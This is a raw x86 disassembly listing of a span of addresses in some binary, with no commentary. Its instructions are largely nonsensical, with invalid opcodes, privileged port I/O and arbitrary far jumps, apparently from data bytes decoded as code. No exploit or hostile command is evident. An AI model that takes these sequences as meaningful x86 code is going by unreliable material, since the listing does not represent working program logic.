  4172c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172c8:	sub    cl,BYTE PTR [eax]
  4172ca:	dec    edx
  4172cb:	or     eax,0x9d6b0e4b
  4172d0:	push   ebx
  4172d1:	cmc    
  4172d2:	ror    edi,0x18
  4172d5:	and    bh,BYTE PTR [edi]
  4172d7:	enter  0x4ad2,0xf8
  4172db:	fstp   QWORD PTR [esi-0x731b0df]
  4172e1:	sbb    dh,al
  4172e3:	in     eax,0xd8
  4172e5:	and    BYTE PTR [ebx],bh
  4172e7:	fs push edi
  4172e9:	sbb    eax,0xa4be2aef
  4172ee:	or     DWORD PTR [ecx+edx*4],0xd3bf689f
  4172f5:	xchg   DWORD PTR [ebx+0x3d],ebp
  4172f8:	shl    DWORD PTR [eax+0x7d31896f],0xe5
  4172ff:	enter  0xdb7c,0xc2
  417303:	mov    edx,0x2c1556c3
  417308:	mov    ds:0xd18414b0,eax
  41730d:	mov    fs,WORD PTR [ecx+edi*1+0x1ef49e5d]
  417314:	inc    esp
  417315:	push   esi
  417316:	push   cs
  417317:	and    BYTE PTR [esi-0x258c56ac],bl
  41731d:	cmp    BYTE PTR [ebx-0x45730d1e],0xb7
  417324:	pop    ss
  417325:	add    ch,dh
  417327:	mov    ecx,esi
  417329:	xchg   edi,eax
  41732a:	fs std 
  41732c:	daa    
  41732d:	sahf   
  41732e:	call   0xf057c32c
  417333:	sbb    DWORD PTR [ebx+0x2376c19e],ecx
  417339:	stos   DWORD PTR es:[edi],eax
  41733a:	cld    
  41733b:	jg     0x417377
  41733d:	jo     0x417329
  41733f:	call   ebp
  417341:	add    DWORD PTR [eax],eax
	...
  4173b3:	add    bl,dh
  4173b5:	inc    ebx
  4173b6:	ror    cl,1
  4173b8:	lock (bad) 
  4173bb:	jnp    0x4173cb
  4173bd:	jmp    0x41733f
  4173bf:	sbb    al,0x3a
  4173c1:	sti    
  4173c2:	jae    0x417367
  4173c4:	xchg   edx,eax
  4173c5:	std    
  4173c6:	add    BYTE PTR [eax],al
  4173c8:	test   BYTE PTR [eax],0x0
  4173cb:	add    BYTE PTR [ebx],bl
  4173cd:	mov    ch,0xc1
  4173cf:	shr    BYTE PTR [ecx],0xe7
  4173d2:	cmp    eax,0x9162c080
  4173d7:	sbb    DWORD PTR [edx+0x16ed343f],esp
  4173dd:	(bad)  
  4173de:	icebp  
  4173df:	retf   
  4173e0:	mov    cl,0x6a
  4173e2:	adc    edi,DWORD PTR ds:0x52570311
  4173e8:	outs   dx,DWORD PTR ds:[esi]
  4173e9:	push   eax
  4173ea:	sahf   
  4173eb:	lds    ecx,FWORD PTR ds:0x231e4208
  4173f1:	dec    BYTE PTR [ebx-0x20]
  4173f4:	mov    al,0xf2
  4173f6:	cld    
  4173f7:	or     dl,BYTE PTR [edi+0x72]
  4173fa:	mov    dh,0x1c
  4173fc:	loopne 0x4173df
  4173fe:	loope  0x417406
  417400:	xor    al,0xa6
  417402:	ret    
  417403:	push   0xffffffe5
  417405:	out    dx,al
  417406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417407:	in     eax,dx
  417408:	sbb    BYTE PTR ds:0xed68265c,cl
  41740e:	fadd   QWORD PTR [esi+ecx*8-0x20]
  417412:	mov    dl,0x7d
  417414:	sbb    dh,BYTE PTR [ecx-0x5fd92fd0]
  41741a:	and    ch,dh
  41741c:	inc    edx
  41741d:	mov    esi,0x3aa1ae2d
  417422:	mov    BYTE PTR [edi+0x2d],cl
  417425:	dec    esi
  417426:	imul   esi,ecx,0x531fc73f
  41742c:	and    BYTE PTR [eax],dh
  41742e:	aas    
  41742f:	adc    al,0x36
  417431:	push   eax
  417432:	xchg   DWORD PTR ds:0xe4831a00,ecx
  417438:	adc    esi,DWORD PTR [ebx-0x5]
  41743b:	and    ecx,ebx
  41743d:	pop    ss
  41743e:	fsub   st,st(5)
  417440:	ins    DWORD PTR es:[edi],dx
  417441:	pop    ebx
  417442:	xchg   ecx,eax
  417443:	in     al,0xe5
  417445:	test   eax,0x32328e01
  41744a:	rcl    DWORD PTR [ecx],cl
  41744c:	rcr    dh,cl
  41744e:	ret    0x50e1
  417451:	pop    es
  417452:	mov    ch,BYTE PTR [edi-0x57]
  417455:	sbb    al,0xe1
  417457:	jmp    0x417478
  417459:	inc    ecx
  41745a:	inc    esi
  41745b:	rep stos BYTE PTR es:[edi],al
  41745d:	mov    ebp,0xa5bcdaa6
  417462:	int3   
  417463:	adc    bh,BYTE PTR [eax+0x3d]
  417466:	dec    ebx
  417467:	sahf   
  417468:	mov    eax,0xe608718d
  41746d:	jns    0x417494
  41746f:	les    ebx,FWORD PTR [eax-0xb]
  417472:	and    eax,0xfcb880d3
  417477:	mov    edx,0xbc7524c
  41747c:	jo     0x4174c9
  41747e:	pusha  
  41747f:	lock cld 
  417481:	push   ds
  417482:	cmp    eax,0xa7da902b
  417487:	loopne 0x4174c2
  417489:	js     0x41749d
  41748b:	ret    0xe908
  41748e:	xor    eax,0x2c7fa47f
  417493:	mov    esi,0x45c47aad
  417498:	mov    esp,0x24fe9df
  41749d:	push   cs
  41749e:	push   esi
  41749f:	xor    BYTE PTR [edi-0x7d],bh
  4174a2:	in     al,dx
  4174a3:	clc    
  4174a4:	pop    ebx
  4174a5:	mov    dl,0x90
  4174a7:	or     al,0x6c
  4174a9:	push   edi
  4174aa:	scas   al,BYTE PTR es:[edi]
  4174ab:	add    al,0xa7
  4174ad:	push   eax
  4174ae:	push   edi
  4174af:	or     al,0x73
  4174b1:	aam    0xc7
  4174b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174b4:	adc    eax,0x2910b8a6
  4174b9:	or     BYTE PTR [eax+0x4b39e02f],bh
  4174bf:	aam    0x17
  4174c1:	inc    edx
	...
  417532:	add    BYTE PTR [eax],al
  417534:	and    eax,0xfff32bd8
  417539:	repz std 
  41753b:	fimul  WORD PTR [edx]
  41753d:	mov    edi,0xc7e93b7a
  417542:	xchg   bh,cl
  417544:	mov    dh,bh
  417546:	add    BYTE PTR [eax],al
  417548:	test   BYTE PTR [eax],0x0
  41754b:	add    BYTE PTR [ebx-0x3ce89c10],bh
  417551:	pop    ebx
  417552:	and    BYTE PTR [eax+ebp*1+0x3a721b5c],dl
  417559:	das    
  41755a:	arpl   WORD PTR [edx+0x16927bd8],cx
  417560:	ss aam 0xb4
  417563:	cmp    ah,BYTE PTR [edi-0x30]
  417566:	push   cs
  417567:	cmp    al,0xa8
  417569:	lea    esp,[edi]
  41756b:	push   ss
  41756c:	add    dl,BYTE PTR [ebx+0x45]
  41756f:	pusha  
  417570:	pop    ebp
  417571:	pop    edx
  417572:	inc    edx
  417573:	cmp    eax,0x714f8da2
  417578:	lea    ebp,[edx]
  41757a:	je     0x41753d
  41757c:	rol    al,cl
  41757e:	mov    al,0x65
  417580:	sbb    cl,bl
  417582:	push   edi
  417583:	es mov dl,0x35
  417586:	nop
  417587:	jle    0x417559
  417589:	sub    edi,ebp
  41758b:	das    
  41758c:	sub    al,0x8
  41758e:	popa   
  41758f:	cmc    
  417590:	adc    al,0x70
  417592:	xchg   DWORD PTR [edi-0x175a08e9],ebx
  417598:	add    ebp,DWORD PTR [ebp-0x12]
  41759b:	or     BYTE PTR [eax+0x6],ch
  41759e:	xchg   edx,eax
  41759f:	(bad)  
  4175a0:	adc    eax,0x2f3cad51
  4175a5:	xchg   esi,eax
  4175a6:	xchg   ebx,eax
  4175a7:	and    bl,BYTE PTR [edi]
  4175a9:	(bad)  
  4175aa:	loope  0x417606
  4175ac:	inc    eax
  4175ad:	repnz daa 
  4175af:	xor    BYTE PTR [eax+0x4a],ch
  4175b2:	add    BYTE PTR [ecx],al
  4175b4:	xchg   ebx,eax
  4175b5:	ds xchg esi,eax
  4175b7:	lea    ebx,[ecx+edi*1]
  4175ba:	ret    0xf94b
  4175bd:	sar    edi,cl
  4175bf:	cmp    eax,0xb6c55db8
  4175c4:	outs   dx,DWORD PTR ds:[esi]
  4175c5:	add    BYTE PTR [edx-0x1d],al
  4175c8:	mov    eax,ds:0x4fc12c89
  4175cd:	mov    ecx,0xccbe545d
  4175d2:	mov    bl,0xfa
  4175d4:	jecxz  0x417594
  4175d6:	sti    
  4175d7:	push   ss
  4175d8:	je     0x4175ba
  4175da:	add    eax,0x7d53130
  4175df:	xchg   edx,eax
  4175e0:	jnp    0x4175be
  4175e2:	or     ah,BYTE PTR [edi]
  4175e4:	fadd   DWORD PTR [edx+0x1f]
  4175e7:	pop    ebp
  4175e8:	je     0x417613
  4175ea:	out    0x67,al
  4175ec:	jns    0x417596
  4175ee:	mov    DWORD PTR [ecx+edx*2-0x7c7cca81],ebx
  4175f5:	pop    ecx
  4175f6:	call   0x6555:0xfced62f1
  4175fd:	sub    ecx,DWORD PTR [eax+0x30c9595e]
  417603:	retf   
  417604:	mov    WORD PTR [ebx],?
  417606:	inc    esi
  417607:	pop    ss
  417608:	inc    DWORD PTR [edi-0x2481170a]
  41760e:	dec    esi
  41760f:	shl    BYTE PTR [ecx],0x9a
  417612:	sbb    esp,DWORD PTR [ebx]
  417614:	es rol edx,cl
  417617:	jae    0x4175eb
  417619:	xchg   edi,eax
  41761a:	into   
  41761b:	outs   dx,DWORD PTR ds:[esi]
  41761c:	jmp    DWORD PTR [eax]
  41761e:	jns    0x41763e
  417620:	add    edi,ebx
  417622:	ja     0x41765f
  417624:	push   ebx
  417625:	xchg   DWORD PTR [edi+0x2ed75333],edi
  41762b:	mov    BYTE PTR [esi-0x66bdd988],al
  417631:	jmp    FWORD PTR [ebx-0x26fb117a]
  417637:	and    edx,ebp
  417639:	call   0x87574140
  41763e:	cli    
  41763f:	cwde   
  417640:	aad    0x42
	...
  4176b2:	add    BYTE PTR [eax],al
  4176b4:	(bad)  
  4176b5:	(bad)  
  4176b7:	(bad)  
  4176b8:	(bad)  
  4176ba:	out    0xff,eax
  4176bc:	xchg   BYTE PTR [eax],dh
  4176be:	jns    0x4176dd
  4176c0:	jno    0x4176de
  4176c2:	adc    ch,BYTE PTR [edi]
  4176c4:	jle    0x4176c5
  4176c6:	add    BYTE PTR [eax],al
  4176c8:	test   BYTE PTR [eax],0x0
  4176cb:	add    BYTE PTR [esi-0x667fae07],dl
  4176d1:	and    DWORD PTR [edx-0x181645b0],0x7296fd13
  4176db:	je     0x41771b
  4176dd:	adc    al,0xaa
  4176df:	shl    DWORD PTR [ebx-0x2c],1
  4176e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176e3:	pop    es
  4176e4:	mov    bh,0x94
  4176e6:	sti    
  4176e7:	cli    
  4176e8:	aaa    
  4176e9:	scas   al,BYTE PTR es:[edi]
  4176ea:	gs jae 0x417756
  4176ed:	jmp    0xb7f9:0x2c8a2c19
  4176f4:	pop    edx
  4176f5:	sbb    DWORD PTR [ecx],0x11
  4176f8:	inc    esi
  4176f9:	pop    eax
  4176fa:	xor    DWORD PTR [eax+0x69],0xb2abce3c
  417701:	push   edi
  417702:	fstp   TBYTE PTR [ebx]
  417704:	xor    BYTE PTR [ebx+esi*2+0x19be2e9c],0xb
  41770c:	xchg   DWORD PTR [ebp-0x61],ecx
  41770f:	mov    bl,0x8e
  417711:	call   0xc1a4:0x35694d01
  417718:	test   al,0x2e
  41771a:	arpl   sp,dx
  41771c:	enter  0x8739,0x81
  417720:	popf   
  417721:	jne    0x41770d
  417723:	inc    DWORD PTR es:[ecx+ecx*2+0x1bae068e]
  41772b:	and    al,0x55
  41772d:	loopne 0x417751
  41772f:	dec    edx
  417730:	lock outs dx,DWORD PTR ds:[esi]
  417732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417733:	inc    edx
  417734:	stos   DWORD PTR es:[edi],eax
  417735:	sbb    eax,0x8be905df
  41773a:	pushf  
  41773b:	mov    edx,0x8b4cd652
  417740:	add    eax,0xe11bbeba
  417745:	sbb    dl,BYTE PTR [edi+ebx*1]
  417748:	mov    ch,0xe
  41774a:	mov    ebx,0xd35e2554
  41774f:	inc    esi
  417750:	pop    esi
  417751:	pop    ds
  417752:	dec    edx
  417753:	dec    ecx
  417754:	int    0x60
  417756:	mov    ecx,edi
  417758:	inc    edx
  417759:	push   0xffffffff
  41775b:	jmpw   0xd65
  41775f:	sbb    edx,DWORD PTR ss:[ebx]
  417762:	dec    edx
  417763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417764:	outs   dx,DWORD PTR ds:[esi]
  417765:	popf   
  417766:	dec    cl
  417768:	mov    al,ds:0x9c5388ab
  41776d:	ror    BYTE PTR [edi-0x78],cl
  417770:	ret    0x2fe4
  417773:	imul   edi,DWORD PTR [edx+0x1b],0x4b
  417777:	add    al,0x17
  417779:	mov    ch,0x58
  41777b:	push   eax
  41777c:	cli    
  41777d:	jae    0x417741
  41777f:	mov    ebx,0x8f5175e6
  417784:	out    dx,al
  417785:	push   0x84b98c2f
  41778a:	out    0xf2,al
  41778c:	bound  ebp,QWORD PTR [esi-0x16a63664]
  417792:	jmp    0x8d82:0x76b677a6
  417799:	push   esi
  41779a:	loopne 0x41780c
  41779c:	cdq    
  41779d:	scas   eax,DWORD PTR es:[edi]
  41779e:	sar    DWORD PTR [esi+0x1fe208da],0xc
  4177a5:	out    dx,eax
  4177a6:	popa   
  4177a7:	xchg   BYTE PTR [esi-0x70],dl
  4177aa:	stc    
  4177ab:	xchg   ebx,eax
  4177ac:	and    ah,BYTE PTR [ecx]
  4177ae:	pop    ecx
  4177af:	(bad)  
  4177b0:	or     edi,DWORD PTR [ebp-0x90ed5ff]
  4177b6:	xor    eax,0x47c0ecec
  4177bb:	ffree  st(3)
  4177bd:	mov    ebp,0x26e3aa67
	...
  417832:	add    BYTE PTR [eax],al
  417834:	shr    DWORD PTR [edi-0x4810cfa],1
  41783a:	cmc    
  41783b:	scas   eax,DWORD PTR es:[edi]
  41783c:	mov    ebx,0x3e7d6e99
  417841:	inc    eax
  417842:	push   es
  417843:	fnsave [eax+eax*1+0x1]
  417847:	add    dh,dh
  417849:	add    BYTE PTR [eax],al
  41784b:	add    BYTE PTR [esi-0x7c],ch
  41784e:	or     al,0x7
  417850:	pop    esi
  417851:	lock mov eax,ds:0xf7be8e9a
  417857:	jge    0x41784e
  417859:	js     0x417836
  41785b:	icebp  
  41785c:	xor    bl,BYTE PTR [ecx]
  41785e:	icebp  
  41785f:	pop    edi
  417860:	in     al,dx
  417861:	mov    bl,0xf8
  417863:	cmp    eax,0x33ac980e
  417868:	push   ds
  417869:	rol    DWORD PTR [edx-0x7b],0x31
  41786d:	adc    DWORD PTR [ebp*1-0x2dddf63d],ebp
  417874:	adc    eax,DWORD PTR [ebp-0x32]
  417877:	scas   al,BYTE PTR es:[edi]
  417878:	ins    DWORD PTR es:[edi],dx
  417879:	cmp    eax,0x83d79184
  41787e:	aam    0xb5
  417880:	inc    ecx
  417881:	(bad)  
  417882:	inc    ecx
  417883:	xor    dh,BYTE PTR [esp+eax*8]
  417886:	xchg   DWORD PTR ds:0x6a653020,edi
  41788c:	sub    al,0xda
  41788e:	xor    esp,0x98c81452
  417894:	popf   
  417895:	loopne 0x41785c
  417897:	fistp  WORD PTR [eax+0x24]
  41789a:	sbb    ecx,ebx
  41789c:	imul   edx
  41789e:	sub    eax,0x9dfb1ced
  4178a3:	loopne 0x417872
  4178a5:	xchg   edx,eax
  4178a6:	push   esi
  4178a7:	pop    ss
  4178a8:	scas   al,BYTE PTR es:[edi]
  4178a9:	dec    edx
  4178aa:	ins    DWORD PTR es:[edi],dx
  4178ab:	or     eax,0x2c4dbe76
  4178b0:	dec    BYTE PTR [eax-0x59]
  4178b3:	in     al,0x87
  4178b5:	aam    0x8
  4178b7:	outs   dx,DWORD PTR ds:[esi]
  4178b8:	push   esi
  4178b9:	and    al,0xb5
  4178bb:	out    0x6f,al
  4178bd:	jle    0x417875
  4178bf:	test   eax,0xe940cae7
  4178c4:	inc    eax
  4178c5:	xor    BYTE PTR [ebx+0x1a8425cb],ah
  4178cb:	cmc    
  4178cc:	out    dx,al
  4178cd:	aam    0x97
  4178cf:	fst    QWORD PTR [esi+0x6b67e32]
  4178d5:	jecxz  0x4178a7
  4178d7:	mov    ds:0x8fcd1384,eax
  4178dc:	mov    esp,DWORD PTR [ecx]
  4178de:	lods   al,BYTE PTR ds:[esi]
  4178df:	and    ebp,DWORD PTR [ebp+eax*4-0x76]
  4178e3:	dec    eax
  4178e4:	aaa    
  4178e5:	sti    
  4178e6:	shr    DWORD PTR [ecx+0x2b],cl
  4178e9:	dec    ebx
  4178ea:	jp     0x4178d0
  4178ec:	mov    esp,0xd68f81e2
  4178f1:	out    0x2a,eax
  4178f3:	test   eax,0xae90c437
  4178f9:	test   BYTE PTR [edx+ecx*8-0x3a],ch
  4178fd:	sar    BYTE PTR [edi],0x81
  417900:	jmp    0xd2bb753c
  417905:	pop    ebx
  417906:	pop    esi
  417907:	(bad)  
  417908:	retf   
  417909:	fidivr DWORD PTR [ecx+0x1e05df2b]
  41790f:	and    edi,DWORD PTR [edx-0x70]
  417912:	retf   
  417913:	cmc    
  417914:	xor    al,0xf1
  417916:	pop    ecx
  417917:	mov    cl,0xd5
  417919:	dec    edi
  41791a:	(bad)  
  41791b:	pop    edx
  41791c:	xor    eax,0x2e043c75
  417921:	sbb    al,0x22
  417923:	fmulp  st(4),st
  417925:	mov    ecx,0x862243e3
  41792a:	das    
  41792b:	xchg   ebp,eax
  41792c:	sar    BYTE PTR [esi+0x11],cl
  41792f:	add    al,0xdc
  417931:	aad    0x18
  417933:	out    0xb8,al
  417935:	ror    DWORD PTR [edi-0x2a],0xe3
  417939:	fwait
  41793a:	(bad)  
  41793b:	aam    0x6
  41793d:	(bad)
  417940:	aas    
  417941:	pop    esp
	...
  4179b2:	add    BYTE PTR [eax],al
  4179b4:	retf   
  4179b5:	pusha  
  4179b6:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  4179bc:	lea    esi,[esi-0x7d6f3680]
  4179c2:	pop    eax
  4179c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4179c4:	push   0x1
  4179c6:	add    DWORD PTR [eax],eax
  4179c8:	test   BYTE PTR [eax],0x0
  4179cb:	add    al,bh
  4179cd:	shl    ecx,1
  4179cf:	sbb    esi,ebx
  4179d1:	push   eax
  4179d2:	push   ss
  4179d3:	in     eax,0x84
  4179d5:	mov    dl,0xa9
  4179d7:	loopne 0x4179e2
  4179d9:	loope  0x417a40
  4179db:	arpl   WORD PTR [edx-0x2b],sp
  4179de:	es aad 0x93
  4179e1:	jmp    0xce65468e
  4179e6:	mov    ah,0x15
  4179e8:	mov    ah,0x31
  4179ea:	mov    WORD PTR [eax+0x52],gs
  4179ed:	ds clc 
  4179ef:	in     al,0x5d
  4179f1:	jmp    0x612962c9
  4179f6:	test   al,0xce
  4179f8:	adc    BYTE PTR [ecx+ecx*4-0x4c],0xcc
  4179fd:	in     al,dx
  4179fe:	imul   eax,edi,0x73
  417a01:	jb     0x4179d0
  417a03:	(bad)  
  417a04:	mov    esi,0x4d23c8bd
  417a09:	sbb    al,BYTE PTR [ebx+ebp*8+0xb]
  417a0d:	jmp    0xdf5:0xd7293edb
  417a14:	jae    0x417a8c
  417a16:	xchg   esp,eax
  417a17:	add    BYTE PTR [edi+eiz*1+0x10],ch
  417a1b:	jmp    0x242b:0xfc5c5f83
  417a22:	jmp    0x9171:0xe9e3f6f3
  417a29:	sub    dl,BYTE PTR [eax+0x28]
  417a2c:	dec    ecx
  417a2d:	xor    eax,0x42f71ba3
  417a32:	data16 sbb al,0x63
  417a35:	stc    
  417a36:	jmp    0x5b75ae5a
  417a3b:	inc    esp
  417a3c:	pushf  
  417a3d:	fiadd  WORD PTR [edx+0x55197f1e]
  417a43:	(bad)  
  417a44:	xchg   esp,eax
  417a45:	cmc    
  417a46:	ins    BYTE PTR es:[edi],dx
  417a47:	fdivr  DWORD PTR [ebx+edi*8-0x2e719f37]
  417a4e:	push   0x19
  417a50:	mov    ch,0xe
  417a52:	cli    
  417a53:	jg     0x417a91
  417a55:	es push esi
  417a57:	jne    0x417a79
  417a59:	adc    ch,al
  417a5b:	mov    ds:0xb2a01a36,eax
  417a60:	sub    dl,0x73
  417a63:	add    DWORD PTR [ebx+0x19],edi
  417a66:	loop   0x417adc
  417a68:	mov    al,ds:0x199bef59
  417a6d:	mov    edi,0x7fe1e74d
  417a72:	push   cs
  417a73:	xchg   ebx,eax
  417a74:	retf   0x3101
  417a77:	ja     0x4179f9
  417a79:	push   esi
  417a7a:	(bad)  
  417a7c:	loope  0x417a71
  417a7e:	ret    0x2fb5
  417a81:	jbe    0x417a96
  417a83:	pop    edi
  417a84:	inc    ecx
  417a85:	cdq    
  417a86:	mov    al,ds:0xf1ea75ef
  417a8b:	push   0x4860a46f
  417a90:	pop    eax
  417a91:	fs mov ecx,0x3ed0ab07
  417a97:	mov    al,ds:0x5b6b136b
  417a9c:	call   0x8ded:0xdceea2ca
  417aa3:	pop    edi
  417aa4:	sbb    edx,DWORD PTR [ebx+0x0]
  417aa7:	cwde   
  417aa8:	dec    ecx
  417aa9:	stos   BYTE PTR es:[edi],al
  417aaa:	push   edx
  417aab:	int3   
  417aac:	loope  0x417a43
  417aae:	in     eax,dx
  417aaf:	in     eax,dx
  417ab0:	fst    st(2)
  417ab2:	jp     0x417a9d
  417ab4:	push   ss
  417ab5:	pushf  
  417ab6:	ins    DWORD PTR es:[edi],dx
  417ab7:	in     al,0x8c
  417ab9:	call   0xa917:0x5dc1dfb9
  417ac0:	jl     0x417aed
	...
  417b32:	add    BYTE PTR [eax],al
  417b34:	jecxz  0x417b9b
  417b36:	push   cs
  417b37:	test   DWORD PTR [esi+0x6a75fbff],0x52fef5f7
  417b41:	clc    
  417b42:	in     eax,0x83
  417b44:	pusha  
  417b45:	add    al,BYTE PTR [ecx]
  417b47:	add    dh,dh
  417b49:	add    BYTE PTR [eax],al
  417b4b:	add    bl,dh
  417b4d:	arpl   dx,bp
  417b4f:	jle    0x417bcd
  417b51:	sbb    BYTE PTR [edi+0x77b966a7],ah
  417b57:	sbb    ch,BYTE PTR [ecx-0x1a]
  417b5a:	test   DWORD PTR [edi+0x3c30ceac],0xb6d2c9a1
  417b64:	jmp    0x3eef34aa
  417b69:	push   edi
  417b6a:	or     al,0x3d
  417b6c:	push   ss
  417b6d:	add    esi,DWORD PTR [edx-0x39640793]
  417b73:	push   ss
  417b74:	add    BYTE PTR [ebp+esi*4+0x48],bl
  417b78:	fs sahf 
  417b7a:	jne    0x417ba1
  417b7c:	lds    edx,FWORD PTR [ebp-0x63]
  417b7f:	sub    esi,DWORD PTR [esi-0xc]
  417b82:	or     eax,0xfc52a214
  417b87:	mov    eax,ds:0x66b35554
  417b8c:	cwde   
  417b8d:	dec    esp
  417b8e:	sub    eax,0xef906cd0
  417b93:	loop   0x417b90
  417b95:	in     al,0xaf
  417b97:	cld    
  417b98:	mov    esp,0x9415a122
  417b9d:	loop   0x417ba6
  417b9f:	inc    ebp
  417ba0:	(bad)  
  417ba1:	push   esi
  417ba2:	in     al,dx
  417ba3:	push   cs
  417ba4:	inc    BYTE PTR [edx]
  417ba6:	add    eax,0x323ca802
  417bab:	stos   BYTE PTR es:[edi],al
  417bac:	and    cl,BYTE PTR [ebx]
  417bae:	mov    ecx,0x9f4565da
  417bb3:	cmp    ebp,DWORD PTR [eax+0x2f]
  417bb6:	and    ecx,DWORD PTR [edx+0x146b9fe2]
  417bbc:	call   0x5599:0x5a90a1ff
  417bc3:	test   eax,0x6dddbf47
  417bc8:	in     eax,0xeb
  417bca:	mov    ecx,0xbd4d7bf0
  417bcf:	pop    edx
  417bd0:	mov    WORD PTR [edx-0x74],es
  417bd3:	das    
  417bd4:	xchg   BYTE PTR [ebp+0xdc3a2a7],al
  417bda:	push   edi
  417bdb:	test   BYTE PTR [edi-0x70710884],ch
  417be1:	mov    eax,0x5ec290c3
  417be6:	pop    esp
  417be7:	mov    al,ds:0x60db473f
  417bec:	adc    bl,dl
  417bee:	push   ebp
  417bef:	(bad)  
  417bf1:	std    
  417bf2:	(bad)  
  417bf3:	shl    DWORD PTR [ebp+0x1f1ca4ce],cl
  417bf9:	das    
  417bfa:	(bad)  
  417bfb:	mov    ebp,0x75ab3892
  417c00:	les    ebp,FWORD PTR [ecx+0x87af853]
  417c06:	pusha  
  417c07:	test   al,0xe
  417c09:	pushf  
  417c0a:	mov    esp,0xac260b78
  417c0f:	aam    0x90
  417c11:	adc    BYTE PTR [ecx-0x45],0xf2
  417c15:	ja     0x417bb9
  417c17:	retf   0x489c
  417c1a:	scas   al,BYTE PTR es:[edi]
  417c1b:	xchg   esp,eax
  417c1c:	dec    edi
  417c1d:	jo     0x417c2a
  417c1f:	test   BYTE PTR [esi+ebp*4],al
  417c22:	in     eax,dx
  417c23:	jg     0x417bde
  417c25:	cmp    BYTE PTR [ebx+0x7c],dh
  417c28:	jae    0x417c10
  417c2a:	mov    al,ds:0x6e93da9b
  417c2f:	or     cl,BYTE PTR [ebx+eiz*4+0x625db2a8]
  417c36:	adc    eax,0xa1bd4941
  417c3b:	dec    edi
  417c3c:	pop    edi
  417c3d:	xor    DWORD PTR [esi+0x85dec4],edi
	...
  417cb3:	add    BYTE PTR [ecx],ah
  417cb5:	xchg   ebx,eax
  417cb6:	mov    DWORD PTR [edi-0x60d84045],ebp
  417cbc:	(bad)  
  417cbd:	jle    0x417d17
  417cbf:	sbb    DWORD PTR [ebp+0x54],edi
  417cc2:	scas   al,BYTE PTR es:[edi]
  417cc3:	mov    eax,0x10356
  417cc8:	test   BYTE PTR [eax],0x0
  417ccb:	add    BYTE PTR [eax+0x21],dl
  417cce:	adc    ch,BYTE PTR [ebp-0x7b]
  417cd1:	(bad)  
  417cd2:	mov    al,0x2a
  417cd4:	push   0xffffffc5
  417cd6:	mov    edi,0x6b9a43a
  417cdb:	stc    
  417cdc:	xlat   BYTE PTR ds:[ebx]
  417cdd:	jecxz  0x417cea
  417cdf:	je     0x417d5f
  417ce1:	and    BYTE PTR [edi+0x60],bl
  417ce4:	dec    esp
  417ce5:	in     al,dx
  417ce6:	(bad)  
  417ce7:	out    0x4a,eax
  417ce9:	mov    edx,0x85190aa2
  417cee:	inc    ecx
  417cef:	sbb    edi,DWORD PTR [ebp+edi*1-0x5e]
  417cf3:	mov    ecx,0xf3d00808
  417cf8:	mov    ch,BYTE PTR [ebp+0x1815a3f9]
  417cfe:	adc    ah,BYTE PTR [edi]
  417d00:	push   0x3e
  417d02:	xchg   edx,eax
  417d03:	jne    0x417d46
  417d05:	add    al,BYTE PTR ds:[ebx-0x2b]
  417d09:	push   edi
  417d0a:	jo     0x417cf8
  417d0c:	sbb    bh,dh
  417d0e:	aaa    
  417d0f:	mov    ecx,0x605e43b5
  417d14:	sub    bl,BYTE PTR [edx]
  417d16:	sub    esi,ebx
  417d18:	je     0x417cd5
  417d1a:	mov    ds:0xb1c79f9e,al
  417d1f:	push   ecx
  417d20:	dec    esi
  417d21:	push   0x1b
  417d23:	add    al,0x2b
  417d25:	in     al,dx
  417d26:	jge    0x417cd0
  417d28:	out    0x92,eax
  417d2a:	and    BYTE PTR [ebx-0x36],al
  417d2d:	call   0x9496e100
  417d32:	dec    ebx
  417d33:	fidivr DWORD PTR [edi-0x7]
  417d36:	inc    eax
  417d37:	scas   al,BYTE PTR es:[edi]
  417d38:	enter  0xd3d3,0x33
  417d3c:	and    cl,ah
  417d3e:	mov    cl,0x56
  417d40:	cmp    edi,DWORD PTR [edx-0x42d4c20f]
  417d46:	push   0x1
  417d48:	sbb    BYTE PTR [edx+0x5beef051],ch
  417d4e:	es adc eax,esp
  417d51:	icebp  
  417d52:	addr16 mov al,dh
  417d55:	loope  0x417d3c
  417d57:	mov    bh,0x42
  417d59:	dec    ecx
  417d5a:	xor    DWORD PTR [esi+edi*1-0x12],eax
  417d5e:	scas   al,BYTE PTR es:[edi]
  417d5f:	test   DWORD PTR [edx+0x41560ead],0x26e1d36f
  417d69:	ins    BYTE PTR es:[edi],dx
  417d6a:	or     BYTE PTR [esi+edx*4],ch
  417d6d:	inc    ebx
  417d6e:	gs add eax,0x7ad2ceca
  417d74:	test   al,0xc1
  417d76:	cli    
  417d77:	retf   0xa20a
  417d7a:	xor    BYTE PTR [esi+edi*4-0x1d],ch
  417d7e:	mov    esi,0x899c60a
  417d83:	cdq    
  417d84:	cmp    DWORD PTR [esp+ebp*8],eax
  417d87:	ins    BYTE PTR es:[edi],dx
  417d88:	jmp    0xf074:0x4de7ccac
  417d8f:	imul   esi,DWORD PTR ss:[edi-0x33],0xa
  417d94:	dec    ecx
  417d95:	iret   
  417d96:	ret    
  417d97:	cwde   
  417d98:	int3   
  417d99:	int3   
  417d9a:	jg     0x417de4
  417d9c:	shl    BYTE PTR [ebp-0x6c],cl
  417d9f:	sub    dl,BYTE PTR [edx]
  417da1:	mov    cl,0x56
  417da3:	dec    ebp
  417da4:	sub    al,0x2a
  417da6:	sahf   
  417da7:	push   esi
  417da8:	or     edi,DWORD PTR [ebx+0x2e]
  417dab:	aas    
  417dac:	repz sti 
  417dae:	into   
  417daf:	(bad)  
  417db0:	icebp  
  417db1:	call   0x9cf15140
  417db6:	nop
  417db7:	neg    BYTE PTR [edi+0x28]
  417dba:	sub    BYTE PTR [esi+0x7340a75f],al
  417dc0:	loope  0x417d9d
	...
  417e32:	add    BYTE PTR [eax],al
  417e34:	mov    edi,0xae6d8e19
  417e39:	(bad)  
  417e3a:	(bad)  
  417e3b:	(bad)  
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	aam    0xef
  417e40:	cmc    
  417e41:	stos   BYTE PTR es:[edi],al
  417e42:	jns    0x417e73
  417e44:	dec    esp
